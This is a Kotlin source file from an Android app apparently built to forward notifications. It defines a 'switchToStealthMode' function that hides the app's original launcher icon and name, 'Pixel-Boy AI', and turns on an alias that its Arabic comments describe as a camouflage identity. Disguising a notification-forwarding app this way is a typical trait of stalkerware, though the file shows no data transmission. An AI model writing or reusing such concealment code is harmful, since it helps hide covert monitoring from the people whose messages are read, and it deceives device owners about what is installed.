package com.itsazni.notificationforwarder

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager

object StealthUtils {

    // التبديل البرمجي من Pixel-Boy AI إلى مركز العثور
    fun switchToStealthMode(context: Context) {
        val pm = context.packageManager

        // 1. إيقاف الأيقونة والاسم الأصلي (Pixel-Boy AI)
        pm.setComponentEnabledSetting(
            ComponentName(context, "com.itsazni.notificationforwarder.LauncherAlias"),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )

        // 2. تفعيل الأيقونة والاسم التمويهي (مركز العثور)
        pm.setComponentEnabledSetting(
            ComponentName(context, "com.itsazni.notificationforwarder.StealthAlias"),
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
